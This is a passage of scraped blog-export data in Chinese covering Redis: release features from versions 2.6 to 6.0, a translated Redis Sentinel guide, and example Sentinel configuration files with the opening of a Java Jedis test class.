1234567891011121314相比于Redis2.4，主要特性如下：1）服务端支持Lua脚本。2）去掉虚拟内存相关功能。3）放开对客户端连接数的硬编码限制。4）键的过期时间支持毫秒。5）从节点提供只读功能。6）两个新的位图命令：bitcount和bitop。7）增强了redis-benchmark的功能：支持定制化的压测，CSV输出等功能。8）基于浮点数自增命令：incrbyfloat和hincrbyfloat。9）redis-cli可以使用--eval参数实现Lua脚本执行。10）shutdown命令增强。11）info可以按照section输出，并且添加了一些统计项。12）重构了大量的核心代码，所有集群相关的代码都去掉了，cluster功能将会是3.0版本最大的亮点。13）sort命令优化。 2.Redis2.8Redis2.8在2013年11月22日正式发布，经历了24个版本，到2.8.24版本， 1234567891011相比于Redis2.6，主要特性如下：1）添加部分主从复制的功能，在一定程度上降低了由于网络问题，造成频繁全量复制生成RDB对系统造成的压力。2）尝试性地支持IPv6。3）可以通过config set命令设置maxclients。4）可以用bind命令绑定多个IP地址。5）Redis设置了明显的进程名，方便使用ps命令查看系统进程。6）config rewrite命令可以将config set持久化到Redis配置文件中。7）发布订阅添加了pubsub命令。8）Redis Sentinel第二版，相比于Redis2.6的Redis Sentinel，此版本已经变成生产可用。 3.Redis3.0Redis3.0在2015年4月1日正式发布， 1234567891011121314151617181920相比于Redis2.8主要特性如下：注意Redis3.0最大的改动就是添加Redis的分布式实现Redis Cluster，填补了Redis官方没有分布式实现的空白。Redis Cluster经历了4年才正式发布也是有原因的，具体可以参考Redis Cluster的开发日志（http://antirez.com/news/79）。1）Redis Cluster：Redis的官方分布式实现。2）全新的embedded string对象编码结果，优化小对象内存访问，在特定的工作负载下速度大幅提升。3）lru算法大幅提升。4）migrate连接缓存，大幅提升键迁移的速度。5）migrate命令两个新的参数copy和replace。6）新的client pause命令，在指定时间内停止处理客户端请求。7）bitcount命令性能提升。8）config set设置maxmemory时候可以设置不同的单位（之前只能是字节），例如config set maxmemory1gb。9）Redis日志小做调整：日志中会反应当前实例的角色（master或者slave）。10）incr命令性能提升。 4.Redis3.2Redis3.2在2016年5月6日正式发布， 1234567891011121314151617相比于Redis3.0主要特征如下：1）添加GEO相关功能。2）SDS在速度和节省空间上都做了优化。3）支持用upstart或者systemd管理Redis进程。4）新的List编码类型：quicklist。5）从节点读取过期数据保证一致性。6）添加了hstrlen命令。7）增强了debug命令，支持了更多的参数。8）Lua脚本功能增强。9）添加了Lua Debugger。10）config set支持更多的配置参数。11）优化了Redis崩溃后的相关报告。12）新的RDB格式，但是仍然兼容旧的RDB。13）加速RDB的加载速度。14）spop命令支持个数参数。15）cluster nodes命令得到加速。16）Jemalloc更新到4.0.3版本。 5.Redis4.0123456789可能出乎很多人的意料，Redis3.2之后的版本是4.0，而不是3.4、3.6、3.8。一般这种重大版本号的升级也意味着软件或者工具本身发生了重大变革，Redis发布了4.0-RC2，下面列出Redis4.0的新特性：1）提供了模块系统，方便第三方开发者拓展Redis的功能，更多模块详见：http://redismodules.com。2）PSYNC2.0：优化了之前版本中，主从节点切换必然引起全量复制的问题。3）提供了新的缓存剔除算法：LFU（Last Frequently Used），并对已有算法进行了优化。4）提供了非阻塞del和flushall/flushdb功能，有效解决删除bigkey可能造成的Redis阻塞。5）提供了RDB-AOF混合持久化格式，充分利用了AOF和RDB各自优势。6）提供memory命令，实现对内存更为全面的监控统计。7）提供了交互数据库功能，实现Redis内部数据库之间的数据置换。8）Redis Cluster兼容NAT和Docker。 6.redis5.012345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273Redis 5主要专注于几个重要功能。相比之下Redis 4非常非常专注于操作类型，Redis 5的变化大多是面向用户的。即在现有的基础上增加新的数据类型和操作类型。以下是此版本的主要功能：Redis 5.01.新的流数据类型(Stream data type) https://redis.io/topics/strea...2.新的 Redis 模块 API：定时器、集群和字典 API(Timers, Cluster and Dictionary APIs)3.RDB 增加 LFU 和 LRU 信息4.集群管理器从 Ruby (redis-trib.rb) 移植到了redis-cli 中的 C 语言代码5.新的有序集合(sorted set)命令：ZPOPMIN/MAX 和阻塞变体(blocking variants)6.升级 Active defragmentation 至 v2 版本7.增强 HyperLogLog 的实现8.更好的内存统计报告9.许多包含子命令的命令现在都有一个 HELP 子命令10.客户端频繁连接和断开连接时，性能表现更好11.许多错误修复和其他方面的改进12.升级 Jemalloc 至 5.1 版本13.引入 CLIENT UNBLOCK 和 CLIENT ID14.新增 LOLWUT 命令 http://antirez.com/news/12315.在不存在需要保持向后兼容性的地方，弃用 &quot;slave&quot; 术语16.网络层中的差异优化17.Lua 相关的改进18.引入动态的 HZ(Dynamic HZ) 以平衡空闲 CPU 使用率和响应性19.对 Redis 核心代码进行了重构并在许多方面进行了改进Redis StreamRedis stream本质上是个时序数据结构，具有如下特点：每条记录是结构化、可扩展的对 每条记录在日志中有唯一标识，标识中包含了时间戳信息，单调递增 可以根据需要自动清理历史记录 保存在内存中，支持持久化底层是修改版的radix tree，每个node存储了一个listpack。listpack是一块连续的内存block，用于序列化msg entry及相关元信息，如msg ID，使用了多种编码，用于节省内存，是ziplist的升级版。如果XADD每次添加的对中的field是一样的，那么field不会重复存储。Redis Stream使用演示￼Redis Stream使用场景可用作时通信等，大数据分析，异地数据备份等￼客户端可以平滑扩展，提高处理能力￼ZpopSorted Sets 增加了类似List的pop命令：ZPOPMAX 命令用于移除并弹出有序集合中分值最大的 count 个元素ZPOPMIN 命令用于移除并弹出有序集合中分值最小的 count 个元素BZPOPMAX 和 BZPOPMIN 是上述两个命令的阻塞变种.￼CLIENT：Client id返回当前连接的ID，每个ID符合如下约束：永不重复，可以判断当前链接是否断链过 单调递增，可以判断不同链接的接入顺序Client unblock：当客户端因为执行具有阻塞功能的命令（如BRPOP、XREAD或者WAIT）被阻塞时，该命令可以通过其他连接解除客户端的阻塞￼Redis 5.0优势：新增的stream数据结构，丰富的应用场景和想象空间 内核的改进和bugfix，使用更健壮支持账号体系，根据账号用途赋予相应的权限，更加安全审计日志，记录了读写操作、敏感操作(keys、flushall等)、慢日志、管理类命令，供用户查询大key分析，基于快照的完整内存分析，更准确，直接输出内存消耗top排行的key 支持单机和集群版的平滑迁移 6.redis6.012345678910111213141516171819202122232425262728293031323334353637383940Redis 6.0 新特性2020.4.30 Redis作者 antirez 在其 [博客](Redis 6.0.0 GA is out!) 宣布：Redis 6.0.0稳定版本发布了。简单介绍一下Redis6.0 有哪些重要新特性。1.多线程IORedis 6引入多线程IO，但多线程部分只是用来处理网络数据的读写和协议解析，执行命令仍然是单线程。之所以这么设计是不想因为多线程而变得复杂，需要去控制 key、lua、事务，LPUSH/LPOP 等等的并发问题。2.重新设计了客户端缓存功能实现了Client-side-caching（客户端缓存）功能。放弃了caching slot，而只使用key names。Redis server-assisted client side caching3.RESP3协议RESP（Redis Serialization Protocol）是 Redis 服务端与客户端之间通信的协议。Redis 5 使用的是 RESP2，而 Redis 6 开始在兼容 RESP2 的基础上，开始支持 RESP3。推出RESP3的目的：一是因为希望能为客户端提供更多的语义化响应，以开发使用旧协议难以实现的功能；另一个原因是实现 Client-side-caching（客户端缓存）功能。4.支持SSL连接支持SSL，更加安全。5.ACL权限控制 1.支持对客户端的权限控制，实现对不同的key授予不同的操作权限。 2.有一个新的ACL日志命令，允许查看所有违反ACL的客户机、访问不应该访问的命令、 访问不应该访问的密钥，或者验证尝试失败。这对于调试ACL问题非常有用。6.提升了RDB日志加载速度 根据文件的实际组成（较大或较小的值），可以预期20/30%的改进。当有很多客户机连接时，信息也更快了，这是一个老问题，现在终于解决了。7.发布官方的Redis集群代理模块 Redis Cluster proxy 在 Redis 集群中，客户端会非常分散，现在为此引入了一个集群代理， 可以为客户端抽象 Redis 群集，使其像正在与单个实例进行对话一样。同时在简单且客户端仅使用简单命令和功能时执行多路复用。8.提供了众多的新模块（modules）API 详情请参考： https://www.cnblogs.com/mumage/p/12832766.html","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"RedisSentinel原理","slug":"data/redis/Redis哨兵","date":"2022-04-07T01:21:38.754Z","updated":"2022-04-07T01:21:38.754Z","comments":true,"path":"2022/04/07/data/redis/Redis哨兵/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/Redis%E5%93%A8%E5%85%B5/","excerpt":"","text":"Redis的Sentinel 文档Redis 的 Sentinel 系统用于管理多个 Redis 服务器（instance）， 该系统执行以下三个任务： 监控（Monitoring）： Sentinel 会不断地检查你的主服务器和从服务器是否运作正常。 提醒（Notification）： 当被监控的某个 Redis 服务器出现问题时， Sentinel 可以通过 API 向管理员或者其他应用程序发送通知。 自动故障迁移（Automatic failover）： 当一个主服务器不能正常工作时， Sentinel 会开始一次自动故障迁移操作， 它会将失效主服务器的其中一个从服务器升级为新的主服务器， 并让失效主服务器的其他从服务器改为复制新的主服务器； 当客户端试图连接失效的主服务器时， 集群也会向客户端返回新主服务器的地址， 使得集群可以使用新主服务器代替失效服务器。 Redis Sentinel 是一个分布式系统， 你可以在一个架构中运行多个 Sentinel 进程（progress）， 这些进程使用流言协议（gossip protocols)来接收关于主服务器是否下线的信息， 并使用投票协议（agreement protocols）来决定是否执行自动故障迁移， 以及选择哪个从服务器作为新的主服务器。 虽然 Redis Sentinel 释出为一个单独的可执行文件 redis-sentinel ， 但实际上它只是一个运行在特殊模式下的 Redis 服务器， 你可以在启动一个普通 Redis 服务器时通过给定 –sentinel 选项来启动 Redis Sentinel 。 获取 Sentinel目前 Sentinel 系统是 Redis 的 unstable 分支的一部分， 你必须到 Redis 项目的 Github 页面 克隆一份 unstable 分值， 然后通过编译来获得 Sentinel 系统。 Sentinel 程序可以在编译后的 src 文档中发现， 它是一个命名为 redis-sentinel 的程序。 你也可以通过下一节介绍的方法， 让 redis-server 程序运行在 Sentinel 模式之下。 另外， 一个新版本的 Sentinel 已经包含在了 Redis 2.8.0 版本的释出文件中。 启动 Sentinel对于 redis-sentinel 程序， 你可以用以下命令来启动 Sentinel 系统： 对于 redis-server 程序， 你可以用以下命令来启动一个运行在 Sentinel 模式下的 Redis 服务器： 1redis-server /path/to/sentinel.conf --sentinel 两种方法都可以启动一个 Sentinel 实例。 启动 Sentinel 实例必须指定相应的配置文件， 系统会使用配置文件来保存 Sentinel 的当前状态， 并在 Sentinel 重启时通过载入配置文件来进行状态还原。 如果启动 Sentinel 时没有指定相应的配置文件， 或者指定的配置文件不可写（not writable）， 那么 Sentinel 会拒绝启动。 配置 SentinelRedis 源码中包含了一个名为 sentinel.conf 的文件， 这个文件是一个带有详细注释的 Sentinel 配置文件示例。 运行一个 Sentinel 所需的最少配置如下所示： 12345678sentinel monitor mymaster 127.0.0.1 6379 2sentinel down-after-milliseconds mymaster 60000sentinel failover-timeout mymaster 180000sentinel parallel-syncs mymaster 1sentinel monitor resque 192.168.1.3 6380 4sentinel down-after-milliseconds resque 10000sentinel failover-timeout resque 180000sentinel parallel-syncs resque 5 第一行配置指示 Sentinel 去监视一个名为 mymaster 的主服务器， 这个主服务器的 IP 地址为 127.0.0.1 ， 端口号为 6379 ， 而将这个主服务器判断为失效至少需要 2 个 Sentinel 同意 （只要同意 Sentinel 的数量不达标，自动故障迁移就不会执行）。 不过要注意， 无论你设置要多少个 Sentinel 同意才能判断一个服务器失效， 一个 Sentinel 都需要获得系统中多数（majority） Sentinel 的支持， 才能发起一次自动故障迁移， 并预留一个给定的配置纪元 （configuration Epoch ，一个配置纪元就是一个新主服务器配置的版本号）。 换句话说， 在只有少数（minority） Sentinel 进程正常运作的情况下， Sentinel 是不能执行自动故障迁移的。 其他选项的基本格式如下： 1sentinel &lt;选项的名字&gt; &lt;主服务器的名字&gt; &lt;选项的值&gt; 各个选项的功能如下： down-after-milliseconds 选项指定了 Sentinel 认为服务器已经断线所需的毫秒数。 如果服务器在给定的毫秒数之内， 没有返回 Sentinel 发送的 PING 命令的回复， 或者返回一个错误， 那么 Sentinel 将这个服务器标记为主观下线（subjectively down，简称 SDOWN ）。 不过只有一个 Sentinel 将服务器标记为主观下线并不一定会引起服务器的自动故障迁移： 只有在足够数量的 Sentinel 都将一个服务器标记为主观下线之后， 服务器才会被标记为客观下线（objectively down， 简称 ODOWN ）， 这时自动故障迁移才会执行。 将服务器标记为客观下线所需的 Sentinel 数量由对主服务器的配置决定。 parallel-syncs 选项指定了在执行故障转移时， 最多可以有多少个从服务器同时对新的主服务器进行同步， 这个数字越小， 完成故障转移所需的时间就越长。 如果从服务器被设置为允许使用过期数据集（参见对 redis.conf 文件中对 slave-serve-stale-data 选项的说明）， 那么你可能不希望所有从服务器都在同一时间向新的主服务器发送同步请求， 因为尽管复制过程的绝大部分步骤都不会阻塞从服务器， 但从服务器在载入主服务器发来的 RDB 文件时， 仍然会造成从服务器在一段时间内不能处理命令请求： 如果全部从服务器一起对新的主服务器进行同步， 那么就可能会造成所有从服务器在短时间内全部不可用的情况出现。 你可以通过将这个值设为 1 来保证每次只有一个从服务器处于不能处理命令请求的状态。 本文档剩余的内容将对 Sentinel 系统的其他选项进行介绍， 示例配置文件 sentinel.conf 也对相关的选项进行了完整的注释。 主观下线和客观下线前面说过， Redis 的 Sentinel 中关于下线（down）有两个不同的概念： 主观下线（Subjectively Down， 简称 SDOWN）指的是单个 Sentinel 实例对服务器做出的下线判断。 客观下线（Objectively Down， 简称 ODOWN）指的是多个 Sentinel 实例在对同一个服务器做出 SDOWN 判断， 并且通过 SENTINEL is-master-down-by-addr 命令互相交流之后， 得出的服务器下线判断。 （一个 Sentinel 可以通过向另一个 Sentinel 发送 SENTINEL is-master-down-by-addr 命令来询问对方是否认为给定的服务器已下线。） 如果一个服务器没有在 master-down-after-milliseconds 选项所指定的时间内， 对向它发送 PING 命令的 Sentinel 返回一个有效回复（valid reply）， 那么 Sentinel 就会将这个服务器标记为主观下线。 服务器对 PING 命令的有效回复可以是以下三种回复的其中一种： 返回 +PONG 。 返回 -LOADING 错误。 返回 -MASTERDOWN 错误。 如果服务器返回除以上三种回复之外的其他回复， 又或者在指定时间内没有回复 PING 命令， 那么 Sentinel 认为服务器返回的回复无效（non-valid）。 注意， 一个服务器必须在 master-down-after-milliseconds 毫秒内， 一直返回无效回复才会被 Sentinel 标记为主观下线。 举个例子， 如果 master-down-after-milliseconds 选项的值为 30000 毫秒（30 秒）， 那么只要服务器能在每 29 秒之内返回至少一次有效回复， 这个服务器就仍然会被认为是处于正常状态的。 从主观下线状态切换到客观下线状态并没有使用严格的法定人数算法（strong quorum algorithm）， 而是使用了流言协议： 如果 Sentinel 在给定的时间范围内， 从其他 Sentinel 那里接收到了足够数量的主服务器下线报告， 那么 Sentinel 就会将主服务器的状态从主观下线改变为客观下线。 如果之后其他 Sentinel 不再报告主服务器已下线， 那么客观下线状态就会被移除。 客观下线条件只适用于主服务器： 对于任何其他类型的 Redis 实例， Sentinel 在将它们判断为下线前不需要进行协商， 所以从服务器或者其他 Sentinel 永远不会达到客观下线条件。 只要一个 Sentinel 发现某个主服务器进入了客观下线状态， 这个 Sentinel 就可能会被其他 Sentinel 推选出， 并对失效的主服务器执行自动故障迁移操作。 每个 Sentinel 都需要定期执行的任务 每个 Sentinel 以每秒钟一次的频率向它所知的主服务器、从服务器以及其他 Sentinel 实例发送一个 PING 命令。 如果一个实例（instance）距离最后一次有效回复 PING 命令的时间超过 down-after-milliseconds 选项所指定的值， 那么这个实例会被 Sentinel 标记为主观下线。 一个有效回复可以是： +PONG 、 -LOADING 或者 -MASTERDOWN 。 如果一个主服务器被标记为主观下线， 那么正在监视这个主服务器的所有 Sentinel 要以每秒一次的频率确认主服务器的确进入了主观下线状态。 如果一个主服务器被标记为主观下线， 并且有足够数量的 Sentinel （至少要达到配置文件指定的数量）在指定的时间范围内同意这一判断， 那么这个主服务器被标记为客观下线。 在一般情况下， 每个 Sentinel 会以每 10 秒一次的频率向它已知的所有主服务器和从服务器发送 INFO 命令。 当一个主服务器被 Sentinel 标记为客观下线时， Sentinel 向下线主服务器的所有从服务器发送 INFO 命令的频率会从 10 秒一次改为每秒一次。 当没有足够数量的 Sentinel 同意主服务器已经下线， 主服务器的客观下线状态就会被移除。 当主服务器重新向 Sentinel 的 PING 命令返回有效回复时， 主服务器的主观下线状态就会被移除。 自动发现 Sentinel 和从服务器一个 Sentinel 可以与其他多个 Sentinel 进行连接， 各个 Sentinel 之间可以互相检查对方的可用性， 并进行信息交换。 你无须为运行的每个 Sentinel 分别设置其他 Sentinel 的地址， 因为 Sentinel 可以通过发布与订阅功能来自动发现正在监视相同主服务器的其他 Sentinel ， 这一功能是通过向频道 sentinel:hello 发送信息来实现的。 与此类似， 你也不必手动列出主服务器属下的所有从服务器， 因为 Sentinel 可以通过询问主服务器来获得所有从服务器的信息。 每个 Sentinel 会以每两秒一次的频率， 通过发布与订阅功能， 向被它监视的所有主服务器和从服务器的 sentinel:hello 频道发送一条信息， 信息中包含了 Sentinel 的 IP 地址、端口号和运行 ID （runid）。 每个 Sentinel 都订阅了被它监视的所有主服务器和从服务器的 sentinel:hello 频道， 查找之前未出现过的 sentinel （looking for unknown sentinels）。 当一个 Sentinel 发现一个新的 Sentinel 时， 它会将新的 Sentinel 添加到一个列表中， 这个列表保存了 Sentinel 已知的， 监视同一个主服务器的所有其他 Sentinel 。 Sentinel 发送的信息中还包括完整的主服务器当前配置（configuration）。 如果一个 Sentinel 包含的主服务器配置比另一个 Sentinel 发送的配置要旧， 那么这个 Sentinel 会立即升级到新配置上。 在将一个新 Sentinel 添加到监视主服务器的列表上面之前， Sentinel 会先检查列表中是否已经包含了和要添加的 Sentinel 拥有相同运行 ID 或者相同地址（包括 IP 地址和端口号）的 Sentinel ， 如果是的话， Sentinel 会先移除列表中已有的那些拥有相同运行 ID 或者相同地址的 Sentinel ， 然后再添加新 Sentinel 。 Sentinel API在默认情况下， Sentinel 使用 TCP端口 26379 （普通 Redis 服务器使用的是 6379 ）。 Sentinel 接受 Redis 协议格式的命令请求， 所以你可以使用 redis-cli 或者任何其他 Redis 客户端来与 Sentinel 进行通讯。 有两种方式可以和 Sentinel 进行通讯： 第一种方法是通过直接发送命令来查询被监视 Redis 服务器的当前状态， 以及 Sentinel 所知道的关于其他 Sentinel 的信息， 诸如此类。 另一种方法是使用发布与订阅功能， 通过接收 Sentinel 发送的通知： 当执行故障转移操作， 或者某个被监视的服务器被判断为主观下线或者客观下线时， Sentinel 就会发送相应的信息。 Sentinel 命令以下列出的是 Sentinel 接受的命令： PING ：返回 PONG 。 SENTINEL masters ：列出所有被监视的主服务器，以及这些主服务器的当前状态。 SENTINEL slaves ：列出给定主服务器的所有从服务器，以及这些从服务器的当前状态。 SENTINEL get-master-addr-by-name ： 返回给定名字的主服务器的 IP 地址和端口号。 如果这个主服务器正在执行故障转移操作， 或者针对这个主服务器的故障转移操作已经完成， 那么这个命令返回新的主服务器的 IP 地址和端口号。 SENTINEL reset ： 重置所有名字和给定模式 pattern 相匹配的主服务器。 pattern 参数是一个 Glob 风格的模式。 重置操作清楚主服务器目前的所有状态， 包括正在执行中的故障转移， 并移除目前已经发现和关联的， 主服务器的所有从服务器和 Sentinel 。 SENTINEL failover ： 当主服务器失效时， 在不询问其他 Sentinel 意见的情况下， 强制开始一次自动故障迁移 （不过发起故障转移的 Sentinel 会向其他 Sentinel 发送一个新的配置，其他 Sentinel 会根据这个配置进行相应的更新）。 发布与订阅信息客户端可以将 Sentinel 看作是一个只提供了订阅功能的 Redis 服务器： 你不可以使用 PUBLISH 命令向这个服务器发送信息， 但你可以用 SUBSCRIBE 命令或者 PSUBSCRIBE 命令， 通过订阅给定的频道来获取相应的事件提醒。 一个频道能够接收和这个频道的名字相同的事件。 比如说， 名为 +sdown 的频道就可以接收所有实例进入主观下线（SDOWN）状态的事件。 通过执行 PSUBSCRIBE /* 命令可以接收所有事件信息。 以下列出的是客户端可以通过订阅来获得的频道和信息的格式： 第一个英文单词是频道/事件的名字， 其余的是数据的格式。 注意， 当格式中包含 instance details 字样时， 表示频道所返回的信息中包含了以下用于识别目标实例的内容： 1&lt;instance-type&gt; &lt;name&gt; &lt;ip&gt; &lt;port&gt; @ &lt;master-name&gt; &lt;master-ip&gt; &lt;master-port&gt; @ 字符之后的内容用于指定主服务器， 这些内容是可选的， 它们仅在 @ 字符之前的内容指定的实例不是主服务器时使用。 +reset-master ：主服务器已被重置。 +slave ：一个新的从服务器已经被 Sentinel 识别并关联。 +failover-state-reconf-slaves ：故障转移状态切换到了 reconf-slaves 状态。 +failover-detected ：另一个 Sentinel 开始了一次故障转移操作，或者一个从服务器转换成了主服务器。 +slave-reconf-sent ：领头（leader）的 Sentinel 向实例发送了 SLAVEOF 命令，为实例设置新的主服务器。 +slave-reconf-inprog ：实例正在将自己设置为指定主服务器的从服务器，但相应的同步过程仍未完成。 +slave-reconf-done ：从服务器已经成功完成对新主服务器的同步。 -dup-sentinel ：对给定主服务器进行监视的一个或多个 Sentinel 已经因为重复出现而被移除 —— 当 Sentinel 实例重启的时候，就会出现这种情况。 +sentinel ：一个监视给定主服务器的新 Sentinel 已经被识别并添加。 +sdown ：给定的实例现在处于主观下线状态。 -sdown ：给定的实例已经不再处于主观下线状态。 +odown ：给定的实例现在处于客观下线状态。 -odown ：给定的实例已经不再处于客观下线状态。 +new-epoch ：当前的纪元（epoch）已经被更新。 +try-failover ：一个新的故障迁移操作正在执行中，等待被大多数 Sentinel 选中（waiting to be elected by the majority）。 +elected-leader ：赢得指定纪元的选举，可以进行故障迁移操作了。 +failover-state-select-slave ：故障转移操作现在处于 select-slave 状态 —— Sentinel 正在寻找可以升级为主服务器的从服务器。 no-good-slave ：Sentinel 操作未能找到适合进行升级的从服务器。Sentinel 会在一段时间之后再次尝试寻找合适的从服务器来进行升级，又或者直接放弃执行故障转移操作。 selected-slave ：Sentinel 顺利找到适合进行升级的从服务器。 failover-state-send-slaveof-noone ：Sentinel 正在将指定的从服务器升级为主服务器，等待升级功能完成。 failover-end-for-timeout ：故障转移因为超时而中止，不过最终所有从服务器都会开始复制新的主服务器（slaves will eventually be configured to replicate with the new master anyway）。 failover-end ：故障转移操作顺利完成。所有从服务器都开始复制新的主服务器了。 +switch-master ：配置变更，主服务器的 IP 和地址已经改变。 这是绝大多数外部用户都关心的信息。 +tilt ：进入 tilt 模式。 -tilt ：退出 tilt 模式。 故障转移一次故障转移操作由以下步骤组成： 发现主服务器已经进入客观下线状态。 对我们的当前纪元进行自增（详情请参考 Raft leader election ）， 并尝试在这个纪元中当选。 如果当选失败， 那么在设定的故障迁移超时时间的两倍之后， 重新尝试当选。 如果当选成功， 那么执行以下步骤。 选出一个从服务器，并将它升级为主服务器。 向被选中的从服务器发送 SLAVEOF NO ONE命令，让它转变为主服务器。 通过发布与订阅功能， 将更新后的配置传播给所有其他 Sentinel ， 其他 Sentinel 对它们自己的配置进行更新。 向已下线主服务器的从服务器发送 SLAVEOF 命令， 让它们去复制新的主服务器。 当所有从服务器都已经开始复制新的主服务器时， 领头 Sentinel 终止这次故障迁移操作。 每当一个 Redis 实例被重新配置（reconfigured） —— 无论是被设置成主服务器、从服务器、又或者被设置成其他主服务器的从服务器 —— Sentinel 都会向被重新配置的实例发送一个 CONFIG REWRITE 命令， 从而确保这些配置会持久化在硬盘里。 Sentinel 使用以下规则来选择新的主服务器： 在失效主服务器属下的从服务器当中， 那些被标记为主观下线、已断线、或者最后一次回复 PING 命令的时间大于五秒钟的从服务器都会被淘汰。 在失效主服务器属下的从服务器当中， 那些与失效主服务器连接断开的时长超过 down-after 选项指定的时长十倍的从服务器都会被淘汰。 在经历了以上两轮淘汰之后剩下来的从服务器中， 我们选出复制偏移量（replication offset）最大的那个从服务器作为新的主服务器； 如果复制偏移量不可用， 或者从服务器的复制偏移量相同， 那么带有最小运行 ID 的那个从服务器成为新的主服务器。 Sentinel 自动故障迁移的一致性特质Sentinel 自动故障迁移使用 Raft 算法来选举领头（leader） Sentinel ， 从而确保在一个给定的纪元（epoch）里， 只有一个领头产生。 这表示在同一个纪元中， 不会有两个 Sentinel 同时被选中为领头， 并且各个 Sentinel 在同一个纪元中只会对一个领头进行投票。 更高的配置纪元总是优于较低的纪元， 因此每个 Sentinel 都会主动使用更新的纪元来代替自己的配置。 简单来说， 我们可以将 Sentinel 配置看作是一个带有版本号的状态。 一个状态会以最后写入者胜出（last-write-wins）的方式（也即是，最新的配置总是胜出）传播至所有其他 Sentinel 。 举个例子， 当出现网络分割（network partitions）时， 一个 Sentinel 可能会包含了较旧的配置， 而当这个 Sentinel 接到其他 Sentinel 发来的版本更新的配置时， Sentinel 就会对自己的配置进行更新。 如果要在网络分割出现的情况下仍然保持一致性， 那么应该使用 min-slaves-to-write 选项， 让主服务器在连接的从实例少于给定数量时停止执行写操作， 与此同时， 应该在每个运行 Redis 主服务器或从服务器的机器上运行 Redis Sentinel 进程。 Sentinel 状态的持久化Sentinel 的状态会被持久化在 Sentinel 配置文件里面。 每当 Sentinel 接收到一个新的配置， 或者当领头 Sentinel 为主服务器创建一个新的配置时， 这个配置会与配置纪元一起被保存到磁盘里面。 这意味着停止和重启 Sentinel 进程都是安全的。 Sentinel 在非故障迁移的情况下对实例进行重新配置即使没有自动故障迁移操作在进行， Sentinel 总会尝试将当前的配置设置到被监视的实例上面。 特别是： 根据当前的配置， 如果一个从服务器被宣告为主服务器， 那么它会代替原有的主服务器， 成/* 为新的主服务器， 并且成为原有主服务器的所有从服务器的复制对象。 那些连接了错误主服务器的从服务器会被重新配置， 使得这些从服务器会去复制正确的主服务器。 不过， 在以上这些条件满足之后， Sentinel 在对实例进行重新配置之前仍然会等待一段足够长的时间， 确保可以接收到其他 Sentinel 发来的配置更新， 从而避免自身因为保存了过期的配置而对实例进行了不必要的重新配置。 TILT 模式Redis Sentinel 严重依赖计算机的时间功能： 比如说， 为了判断一个实例是否可用， Sentinel 会记录这个实例最后一次相应 PING 命令的时间， 并将这个时间和当前时间进行对比， 从而知道这个实例有多长时间没有和 Sentinel 进行任何成功通讯。 不过， 一旦计算机的时间功能出现故障， 或者计算机非常忙碌， 又或者进程因为某些原因而被阻塞时， Sentinel 可能也会跟着出现故障。 TILT 模式是一种特殊的保护模式： 当 Sentinel 发现系统有些不对劲时， Sentinel 就会进入 TILT 模式。 因为 Sentinel 的时间中断器默认每秒执行 10 次， 所以我们预期时间中断器的两次执行之间的间隔为 100 毫秒左右。 Sentinel 的做法是， 记录上一次时间中断器执行时的时间， 并将它和这一次时间中断器执行的时间进行对比： 如果两次调用时间之间的差距为负值， 或者非常大（超过 2 秒钟）， 那么 Sentinel 进入 TILT 模式。 如果 Sentinel 已经进入 TILT 模式， 那么 Sentinel 延迟退出 TILT 模式的时间。 当 Sentinel 进入 TILT 模式时， 它仍然会继续监视所有目标， 但是： 它不再执行任何操作，比如故障转移。 当有实例向这个 Sentinel 发送 SENTINEL is-master-down-by-addr 命令时， Sentinel 返回负值： 因为这个 Sentinel 所进行的下线判断已经不再准确。 如果 TILT 可以正常维持 30 秒钟， 那么 Sentinel 退出 TILT 模式。 处理 -BUSY 状态当 Lua 脚本的运行时间超过指定时限时， Redis 就会返回 -BUSY 错误。 当出现这种情况时， Sentinel 在尝试执行故障转移操作之前， 会先向服务器发送一个 SCRIPT KILL 命令， 如果服务器正在执行的是一个只读脚本的话， 那么这个脚本就会被杀死， 服务器就会回到正常状态。 关于topics/sentinel 互动的最新评论","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"RedisRedisSentinel配置及Java示例","slug":"data/redis/RedisSentinel配置及Java示例","date":"2022-04-07T01:21:38.753Z","updated":"2022-04-07T01:21:38.753Z","comments":true,"path":"2022/04/07/data/redis/RedisSentinel配置及Java示例/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/RedisSentinel%E9%85%8D%E7%BD%AE%E5%8F%8AJava%E7%A4%BA%E4%BE%8B/","excerpt":"","text":"1.redis 配置文件：添加如下配置 1.1.redis_7021.conf12345678port 7021bind 10.10.220.149daemonize yesprotected-mode yestimeout 0tcp-keepalive 300supervised nodir &quot;/data/redis/redis7021/&quot; 1.2.redis_7022.conf123456789port 7022bind 10.10.220.149daemonize yesprotected-mode yestimeout 0tcp-keepalive 300supervised nodir &quot;/data/redis/redis7022/&quot;slaveof 10.10.220.149 7021 1.3.redis_7023.conf123456789port 7023bind 10.10.220.149daemonize yesprotected-mode yestimeout 0tcp-keepalive 300supervised nodir &quot;/data/redis/redis7023/&quot;slaveof 10.10.220.149 7021 2.sentinel 配置文件2.1.sentinel_17021.conf123456port 17021bind 10.10.220.149sentinel monitor mymaster 10.10.220.149 7021 2sentinel down-after-milliseconds mymaster 5000sentinel failover-timeout mymaster 15000sentinel config-epoch mymaster 1 2.2.sentinel_17022.conf123456port 17022bind 10.10.220.149sentinel monitor mymaster 10.10.220.149 7021 2sentinel down-after-milliseconds mymaster 5000sentinel failover-timeout mymaster 15000sentinel config-epoch mymaster 1 2.3.sentinel_17023.conf123456port 17023bind 10.10.220.149sentinel monitor mymaster 10.10.220.149 7021 2sentinel down-after-milliseconds mymaster 5000sentinel failover-timeout mymaster 15000sentinel config-epoch mymaster 1 3.java 测试3.1 测试类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package org.helium.redis.test;import org.junit.Test;import redis.clients.jedis.HostAndPort;import redis.clients.jedis.Jedis;import redis.clients.jedis.JedisPoolConfig;import redis.clients.jedis.JedisSentinelPool;import sun.tools.tree.SynchronizedStatement;import java.io.File;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import 